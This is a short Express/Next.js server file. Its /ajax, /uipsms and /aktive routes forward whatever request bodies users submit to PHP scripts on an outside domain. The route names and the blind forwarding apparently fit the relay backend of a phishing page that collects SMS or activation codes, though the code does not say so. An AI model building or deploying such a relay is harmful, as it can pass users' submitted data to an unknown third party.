const express = require('express');
const next = require('next');
const axios = require('axios');

const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev });
const handle = app.getRequestHandler();

app.prepare().then(() => {
  const server = express();

  server.use(express.json());
  server.use(express.static('public'));

  server.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
  });

  server.all('/ajax', async (req, res) => {
    try {
      const response = await axios.post('https://mavilibeyazajans.com/ajax.php', req.body);
      res.status(response.status).json(response.data);
    } catch (error) {
      res.status(500).json({ error: 'Internal Server Error' });
    }
  });
  
  server.all('/uipsms', async (req, res) => {
    try {
      const response = await axios.post('https://mavilibeyazajans.com/uipsms.php', req.body);
      res.status(response.status).json(response.data);
    } catch (error) {
      res.status(500).json({ error: 'Internal Server Error' });
    }
  });
  server.all('/aktive', async (req, res) => {
    try {
      const response = await axios.post('https://mavilibeyazajans.com/aktive.php', req.body);
      res.status(response.status).json(response.data);
    } catch (error) {
      res.status(500).json({ error: 'Internal Server Error' });
    }
  });
  
  server.all('*', (req, res) => {
    return handle(req, res);
  });

  server.listen(3000, (err) => {
    if (err) throw err;
    console.log('> Ready on http://localhost:3000');
  });
});